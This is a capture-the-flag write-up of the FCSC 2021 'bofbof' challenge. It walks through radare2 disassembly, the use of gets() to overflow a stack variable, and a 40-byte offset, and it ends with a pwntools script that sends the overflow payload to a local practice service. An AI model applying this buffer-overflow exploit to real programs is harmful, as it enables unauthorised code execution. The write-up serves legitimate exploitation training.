# URL
https://hackropole.fr/en/challenges/pwn/fcsc2021-pwn-bofbof/
# Concepts
* overwrite to win
* overwriting program variables
* buffer overflow
* intro to pwntools
# Method of solve
* after setting up our environment, we can look at the program flow in radare2
* the assembly looks like this:
```asm
┌ 132: int main (int argc, char **argv, char **envp);
│ afv: vars(2:sp[0x10..0x38])
│           0x5649e668019f      55             push rbp
│           0x5649e66801a0      4889e5         mov rbp, rsp
│           0x5649e66801a3      4883ec30       sub rsp, 0x30
│           0x5649e66801a7      48b8414141..   movabs rax, 0x4141414141414141 ; 'AAAAAAAA'                                                            
│           0x5649e66801b1      488945f8       mov qword [var_8h], rax
│           0x5649e66801b5      488d3d540e..   lea rdi, str.Comment_est_votre_blanquette___n___ ; 0x5649e6681010 ; "Comment est votre blanquette ?\n>>> "                                                                        
│           0x5649e66801bc      b800000000     mov eax, 0
│           0x5649e66801c1      e88afeffff     call sym.imp.printf     ; int printf(const char *format)                                               
│           0x5649e66801c6      488b058b2e..   mov rax, qword [reloc.stdout] ; [0x5649e6683058:8]=0
│           0x5649e66801cd      4889c7         mov rdi, rax
│           0x5649e66801d0      e89bfeffff     call sym.imp.fflush     ; int fflush(FILE *stream)                                                     
│           0x5649e66801d5      488d45d0       lea rax, [var_30h]
│           0x5649e66801d9      4889c7         mov rdi, rax
│           0x5649e66801dc      b800000000     mov eax, 0
│           0x5649e66801e1      e87afeffff     call sym.imp.gets       ; char *gets(char *s)                                                          
│           0x5649e66801e6      48b8414141..   movabs rax, 0x4141414141414141 ; 'AAAAAAAA'                                                            
│           0x5649e66801f0      483945f8       cmp qword [var_8h], rax
│       ┌─< 0x5649e66801f4      7426           je 0x5649e668021c
│       │   0x5649e66801f6      48b8887766..   movabs rax, 0x1122334455667788                                                                         
│       │   0x5649e6680200      483945f8       cmp qword [var_8h], rax
│      ┌──< 0x5649e6680204      750a           jne 0x5649e6680210
│      ││   0x5649e6680206      b800000000     mov eax, 0
│      ││   0x5649e668020b      e875ffffff     call sym.vuln
│      └──> 0x5649e6680210      488d3d1d0e..   lea rdi, str.Almost_there_ ; 0x5649e6681034 ; "Almost there!"                                          
│       │   0x5649e6680217      e814feffff     call sym.imp.puts       ; int puts(const char *s)                                                      
│       └─> 0x5649e668021c      b800000000     mov eax, 0
│           0x5649e6680221      c9             leave
└           0x5649e6680222      c3             ret
```
* the main takeaways from this function is that there are several comparisons being made with the `qword [var_8h]` memory location
* that memory location is populated at the start of the program with eight letters A's
* unless we use buffer overflow to overwrite the A's variable, we can't get access to the `vuln` function
```
│           0x5649e66801e6      48b8414141..   movabs rax, 0x4141414141414141 ; 'AAAAAAAA'                                                            
│           0x5649e66801f0      483945f8       cmp qword [var_8h], rax
│       ┌─< 0x5649e66801f4      7426           je 0x5649e668021c
│       │   0x5649e66801f6      48b8887766..   movabs rax, 0x1122334455667788                                                                         
│       │   0x5649e6680200      483945f8       cmp qword [var_8h], rax
│      ┌──< 0x5649e6680204      750a           jne 0x5649e6680210
│      ││   0x5649e6680206      b800000000     mov eax, 0
│      ││   0x5649e668020b      e875ffffff     call sym.vuln
```
* so what the program wants us to do is overflow the A's variable and replace it with the the exact hex bytes `0x1122334455667788`
* the first part of the attack is figuring out how much offset we need to include in our buffer overflow payload
* we see that there is `0x30` (48) bytes being set aside for variables
```
sub rsp, 0x30
```
* so the offset is probably going to be close to that number
* eventually, we figure out that the offset is 40 bytes
* we craft a pwntools script to handle sending the payload:
* thanks to EpistemicAnarchist for the basic script
```Python
from pwn import *
import sys
# io = process('./bofbof')
io = remote('localhost', 4000)
payload = b"C"*40 + p64(0x1122334455667788)
io.send(payload)
io.interactive()
```
